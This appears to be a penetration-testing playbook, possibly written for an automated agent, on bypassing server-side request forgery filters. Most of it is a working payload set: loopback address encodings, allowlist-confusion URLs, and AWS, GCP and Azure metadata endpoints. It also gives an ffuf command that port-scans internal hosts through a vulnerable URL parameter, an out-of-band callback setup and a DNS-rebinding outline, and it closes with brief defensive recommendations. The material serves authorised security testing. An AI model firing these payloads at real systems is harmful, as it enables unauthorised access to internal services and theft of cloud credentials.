# Advanced SSRF Bypass Techniques

## Overview
Advanced SSRF testing focuses on bypassing URL filters, allowlists, and scheme
restrictions to reach internal services and cloud metadata endpoints safely.

## Prerequisites
```bash
# OOB callbacks and fuzzing
# (install only if needed)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install github.com/ffuf/ffuf@latest
```

## Phase 1: Identify SSRF Sinks
```bash
# Look for parameters that accept URLs or fetch remote content
# Examples: url, link, avatar, image, webhook, redirect, pdf, fetch
```

## Phase 2: OOB Verification
```bash
interactsh-client -o /workspace/output/TARGET_ssrf_interactsh.txt
# Use the provided domain as CALLBACK
```

## Phase 3: Bypass Payloads
```bash
cat > /workspace/output/TARGET_ssrf_payloads.txt <<'PAYLOADS'
http://127.0.0.1
http://127.0.1
http://localhost
http://[::1]
http://[::ffff:127.0.0.1]
http://2130706433
http://0x7f000001
http://0177.0.0.1
http://ALLOWED_HOST@127.0.0.1
http://127.0.0.1@ALLOWED_HOST
http://ALLOWED_HOST#@127.0.0.1
http://ALLOWED_HOST?next=http://127.0.0.1
http://ALLOWED_HOST/redirect?url=http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://CALLBACK
PAYLOADS
```

## Phase 4: Internal Port Scanning (Timing/Size)
```bash
seq 1 1024 > /workspace/output/ports.txt

ffuf -u "https://TARGET/ssrf?url=http://127.0.0.1:FUZZ" \
  -w /workspace/output/ports.txt \
  -mc all -fs 0 \
  -o /workspace/output/TARGET_ssrf_portscan.json -of json
```

## Phase 5: Cloud Metadata Endpoints
```bash
# AWS
# url=http://169.254.169.254/latest/meta-data/
# GCP (requires header: Metadata-Flavor: Google)
# url=http://metadata.google.internal/computeMetadata/v1/
# Azure
# url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Phase 6: DNS Rebinding & Redirect Chains
```bash
# Use a controlled domain with low TTL that first resolves externally,
# then rebinds to an internal IP. Combine with open redirects when needed.
```

## Report Template

```
Target: TARGET
SSRF Sink: <parameter>
Assessment Date: <DATE>

## Confirmed Findings
- [ ] OOB callback received
- [ ] Filter/allowlist bypass succeeded
- [ ] Internal service accessed
- [ ] Cloud metadata exposed

## Evidence
- Callback log: /workspace/output/TARGET_ssrf_interactsh.txt
- Payloads tried: /workspace/output/TARGET_ssrf_payloads.txt
- Port scan: /workspace/output/TARGET_ssrf_portscan.json

## Recommendations
1. Use allowlists with strict URL parsing and DNS pinning
2. Block internal IP ranges and metadata IPs at the network layer
3. Disable redirects or re-validate after redirects
4. Enforce request timeouts and response size limits
```

## Output Files
- `/workspace/output/TARGET_ssrf_interactsh.txt` — OOB callback log
- `/workspace/output/TARGET_ssrf_payloads.txt` — bypass payloads
- `/workspace/output/TARGET_ssrf_portscan.json` — internal port scan results

indicators: ssrf bypass, advanced ssrf, ssrf filter bypass, allowlist bypass, metadata ssrf, dns rebinding, ssrf ipv6, ssrf encoding
